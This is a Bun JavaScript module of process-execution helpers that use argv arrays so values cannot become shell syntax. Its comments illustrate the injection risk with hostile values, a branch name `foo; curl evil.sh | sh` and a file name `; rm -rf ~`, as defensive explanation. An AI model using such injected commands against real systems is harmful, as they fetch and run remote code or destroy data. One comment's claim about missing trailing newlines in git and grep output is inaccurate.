#!/usr/bin/env bun
/**
 * Bun-native process execution.
 *
 * ## Why this module exists
 *
 * This project has no Node.js runtime. There is no `node` binary on the
 * runner hosts, no `setup-node` step in any workflow, and `package.json`
 * declares `engines.bun` and nothing else. Every process that used to shell
 * out through `node:child_process` runs through here instead.
 *
 * ## The reason this is not just a mechanical rename
 *
 * `node:child_process` was not only a second runtime to keep installed. It
 * was a **shell-injection surface**. `execSync` and `execFile` take a command
 * *string*, so `/bin/sh` parses it — and any interpolated value (a branch
 * name, a file path, a git ref) becomes shell syntax rather than an argument.
 * `post-checkout-deps.mjs` interpolated two `argv` values straight into a
 * command line, which meant a checkout of a branch named
 * `foo; curl evil.sh | sh` was a command line.
 *
 * `Bun.spawnSync` takes an **argv array** and never goes through a shell, so
 * an interpolated value is an argument, not a command. That is why every
 * function here takes an array, and why the one place a shell is genuinely
 * needed (a pipeline, a glob) is opt-in rather than the default.
 *
 * The array form is also faster — no `/bin/sh` process is forked to parse a
 * command line that was never dynamic — and it removes the `maxBuffer` dance:
 * `execFileSync` throws when a command's output exceeds a limit, whereas Bun
 * buffers it without a ceiling.
 *
 * ## Why the shell is opt-in
 *
 * `Bun.$` is Bun's shell, and it is the right tool for pipelines, redirection
 * and globs. It is the *wrong* tool for `git diff --name-only`, which is a
 * single command with a fixed argument list: the argv form is faster, does not
 * fork a shell, and cannot be surprised by a file named `; rm -rf ~`.
 *
 * Where a shell is used, values are interpolated through `$.escape()` or read
 * from a file rather than concatenated.
 */

/**
 * @typedef {object} RunResult
 * @property {number} exitCode   Exit status; `1` when the process was signalled.
 * @property {string} stdout      Captured stdout, or `''` when it was inherited.
 * @property {string} stderr      Captured stderr, or `''` when it was inherited.
 */

/**
 * Run a command synchronously and capture its output.
 *
 * A non-zero exit is **not** an exception here. It is ordinary for
 * `grep -q`, `git diff --quiet` and `bun audit` (which exits non-zero when it
 * finds advisories, having still written its report to stdout), and code
 * that has to catch an exception to read a status is where "swallow the
 * error" bugs live. The caller decides what a failure means.
 *
 * `stdin` is ignored by default. A command that reads stdin would otherwise
 * block a commit hook forever, because a hook has no terminal to read from
 * and no input to give it.
 *
 * @param {string[]} argv          Command and arguments, as an array.
 * @param {object}   [options]     Passed through to `Bun.spawnSync`.
 * @returns {RunResult}
 */
export function run(argv, options = {}) {
  const proc = Bun.spawnSync(argv, {
    stdin: 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
    ...options,
  });

  return {
    // A signalled process has no exit code of its own; report it as a
    // failure rather than as a success with a null status.
    exitCode: proc.exitCode ?? 1,
    stdout: proc.stdout ? proc.stdout.toString('utf8') : '',
    stderr: proc.stderr ? proc.stderr.toString('utf8') : '',
  };
}

/**
 * Run a command and return its stdout.
 *
 * Throws when the command exits non-zero — for a command whose success is
 * the only acceptable outcome.
 *
 * @param {string[]} argv
 * @param {object}   [options]
 * @returns {string}
 */
export function runText(argv, options = {}) {
  const { exitCode, stdout, stderr } = run(argv, options);
  if (exitCode !== 0) {
    const detail = stderr.trim();
    throw new Error(
      `Command failed (exit ${exitCode}): ${argv.join(' ')}${detail ? `\n${detail}` : ''}`
    );
  }
  return stdout;
}

/**
 * Run a command and return its stdout, or `null` when it failed.
 *
 * The "does this exist / does this match" shape, where a non-zero exit is an
 * answer rather than an error.
 *
 * @param {string[]} argv
 * @param {object}   [options]
 * @returns {string | null}
 */
export function tryRunText(argv, options = {}) {
  const { exitCode, stdout } = run(argv, options);
  return exitCode === 0 ? stdout : null;
}

/**
 * Run a command with its output attached to the parent's streams.
 *
 * For a command whose output *is* the message — `bun install`, a build, a
 * test run. The output goes straight to the terminal rather than being
 * buffered, so a long build streams instead of appearing to hang.
 *
 * @param {string[]} argv
 * @param {object}   [options]
 * @returns {number} The exit code.
 */
export function runInherit(argv, options = {}) {
  const proc = Bun.spawnSync(argv, {
    stdin: 'ignore',
    stdout: 'inherit',
    stderr: 'inherit',
    ...options,
  });
  return proc.exitCode ?? 1;
}

/**
 * Run a command asynchronously and capture its output.
 *
 * The asynchronous counterpart to `run`, for a command whose output is
 * awaited rather than blocking the thread — a CLI that takes seconds, or one
 * whose stdout is large enough that buffering it synchronously would be
 * wasteful.
 *
 * @param {string[]} argv
 * @param {object}   [options]
 * @returns {Promise<RunResult>}
 */
export async function runAsync(argv, options = {}) {
  const proc = Bun.spawn(argv, {
    stdin: 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
    ...options,
  });

  const [stdout, stderr, exitCode] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
    proc.exited,
  ]);

  return { exitCode: exitCode ?? 1, stdout, stderr };
}

/**
 * Run a command asynchronously and return its stdout.
 *
 * @param {string[]} argv
 * @param {object}   [options]
 * @returns {Promise<string>}
 */
export async function runTextAsync(argv, options = {}) {
  const { exitCode, stdout, stderr } = await runAsync(argv, options);
  if (exitCode !== 0) {
    const detail = stderr.trim();
    throw new Error(
      `Command failed (exit ${exitCode}): ${argv.join(' ')}${detail ? `\n${detail}` : ''}`
    );
  }
  return stdout;
}

/**
 * Run a command asynchronously, returning its output — and throwing when it
 * fails.
 *
 * The thrown error carries `stdout` and `stderr` on itself, so a caller that
 * needs the output of a *failed* command can still read it. That is the
 * normal case for a store the caller is not allowed to read: `gh secret
 * list` exits non-zero against a project the token cannot see, and the
 * non-zero status is the finding, not an error to swallow.
 *
 * @param {string[]} argv
 * @param {object}   [options]
 * @returns {Promise<RunResult>}
 */
export async function runOrThrow(argv, options = {}) {
  const { exitCode, stdout, stderr } = await runAsync(argv, options);
  if (exitCode !== 0) {
    const error = new Error(`Command failed (exit ${exitCode}): ${argv.join(' ')}`);
    error.exitCode = exitCode;
    error.stdout = stdout;
    error.stderr = stderr;
    throw error;
  }
  return { exitCode, stdout, stderr };
}

/**
 * Split a command's stdout into non-empty lines.
 *
 * `git` and `grep` both terminate the last line without a newline, so a
 * naive `split('\n')` leaves a trailing empty element that then has to be
 * filtered at every call site.
 *
 * @param {string} text
 * @returns {string[]}
 */
export function lines(text) {
  return text.split('\n').filter(Boolean);
}
